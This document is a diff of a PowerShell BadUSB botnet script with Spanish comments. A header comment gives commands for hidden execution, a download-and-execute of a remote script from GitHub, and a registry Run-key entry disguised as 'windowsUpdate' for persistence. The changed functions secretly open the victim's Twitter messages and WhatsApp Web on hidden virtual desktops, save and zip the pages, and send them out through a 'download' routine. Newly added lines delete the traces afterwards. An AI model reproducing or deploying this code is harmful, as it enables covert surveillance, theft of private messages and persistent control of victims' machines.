@@ -1,17 +1,15 @@
+
 <#
 BADUSB COMMANDS:
     # Execute 
     powershell.exe -windowstyle hidden -file this_file.ps1
-
     #Execute script from github
     iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
     PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
     PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-
 REGEDIT:
 	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
 https://www.akadia.com/services/windows_registry.html 
-
 BOT TELEGRAM:
     https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
 	#>
@@ -213,14 +211,28 @@ function webcam {
 function mainBrowser {
     Write-Host "Checking main browser on the reg.."
     $mainBrowser = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
+
     if ($mainBrowser -match 'chrome') {
         Write-Host "Chrome!"
         $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
+        if(![System.IO.File]::Exists($chrome)){
+            $chrome = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
+            Write-Host "Chrome x64!"
+            return $chrome
+        }
+        Write-Host "Chrome x86!"
         return $chrome
      }
+
     ElseIf ($mainBrowser -match 'Firefox') {
         Write-Host "Firefox!"
         $firefox = "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
+        if(![System.IO.File]::Exists($firefox)){
+            $firefox = "${env:ProgramFiles}\Mozilla Firefox\firefox.exe"
+            Write-Host "Firefox x64!"
+            return $firefox
+        }
+        Write-Host "Firefox x86!"
         return $firefox
      }
 }
@@ -229,13 +241,10 @@ function mainBrowser {
 function forceHackTwitter {
     $mainBrowser = mainBrowser
     Start-Process $mainBrowser -ArgumentList "https://twitter.com/login" -WindowStyle Hidden
-
     Start-Sleep -Seconds 2
     $wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('Iniciar sesión en Twitter') 
-
     Start-sleep -Seconds 10
     $wshell.SendKeys("^{s}") 
-
     $wshell.AppActivate('Guardar como')
     Sleep -Seconds 2 
     $wshell.SendKeys('~') 
@@ -268,7 +277,6 @@ public static void CreateVirtualDesktopInWin10()
     keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
     keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
 }
-
 "@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
    
     # Cambia al virtual desktop de la iquierda.
@@ -313,7 +321,7 @@ public static void SwitchRightVirtualDesktopInWin10()
     
     # Inicia el navegador por defecto y abre twitter.
     $mainBrowser = mainBrowser 
-    Start-Process $mainBrowser -ArgumentList '--new-window https://twitter.com/login' 
+    Start-Process $mainBrowser -ArgumentList '--new-window https://twitter.com/messages' 
     Start-Sleep -Seconds 2
     $wshell = New-Object -ComObject wscript.shell
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
@@ -323,7 +331,7 @@ public static void SwitchRightVirtualDesktopInWin10()
 
     # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
     $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
-    $wshell.AppActivate('Iniciar sesión en Twitter') 
+    $wshell.AppActivate('twitter') 
     $wshell.SendKeys("^{s}") 
     $wshell.AppActivate('Guardar como')
     Sleep -Seconds 2 
@@ -333,13 +341,16 @@ public static void SwitchRightVirtualDesktopInWin10()
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
 
     Sleep -Seconds 5
-    Add-Type -assembly "system.io.compression.filesystem"
-    [io.compression.zipfile]::CreateFromDirectory("C:\Users\$env:username\Downloads\w_files", "C:\Users\$env:username\Downloads\t_files.zip") 
+    Get-ChildItem "C:\Users\$env:username\Downloads\t_files" | Compress-Archive -DestinationPath "C:\Users\$env:username\Downloads\t_files.zip" -CompressionLevel Optimal 
 
     Sleep -Seconds 5
     download "C:\Users\$env:username\Downloads\t.html"
     download "C:\Users\$env:username\Downloads\t_files.zip"
-
+        
+    Sleep -Seconds 5
+    Remove-Item "C:\Users\$env:username\Downloads\t.html"
+    Remove-Item -Recurse "C:\Users\$env:username\Downloads\t_files"
+    Remove-Item "C:\Users\$env:username\Downloads\t_files.zip"
 }
 
 function hackWhatsAPPW10 {
@@ -367,7 +378,6 @@ public static void CreateVirtualDesktopInWin10()
     keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
     keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
 }
-
 "@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
    
     # Cambia al virtual desktop de la iquierda.
@@ -422,7 +432,7 @@ public static void SwitchRightVirtualDesktopInWin10()
 
     # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
     $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
-    $wshell.AppActivate('(2) WhatsApp') 
+    $wshell.AppActivate('Mozilla Firefox') 
     $wshell.SendKeys("^{s}") 
     $wshell.AppActivate('Guardar como')
     Sleep -Seconds 2 
@@ -432,12 +442,16 @@ public static void SwitchRightVirtualDesktopInWin10()
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
 
     Sleep -Seconds 5
-    Add-Type -assembly "system.io.compression.filesystem"
-    [io.compression.zipfile]::CreateFromDirectory("C:\Users\$env:username\Downloads\w_files", "C:\Users\$env:username\Downloads\w_files.zip") 
+    Get-ChildItem "C:\Users\$env:username\Downloads\w_files" | Compress-Archive -DestinationPath "C:\Users\$env:username\Downloads\w_files.zip" -CompressionLevel Optimal
 
     Sleep -Seconds 5
     download "C:\Users\$env:username\Downloads\w.html"
     download "C:\Users\$env:username\Downloads\w_files.zip"
+
+    Sleep -Seconds 5
+    Remove-Item "C:\Users\$env:username\Downloads\w.html"
+    Remove-Item -Recurse "C:\Users\$env:username\Downloads\w_files"
+    Remove-Item "C:\Users\$env:username\Downloads\w_files.zip"
 }
 
 
@@ -603,4 +617,3 @@ While ($DoNotExit)  {
 	
   }
 }
-
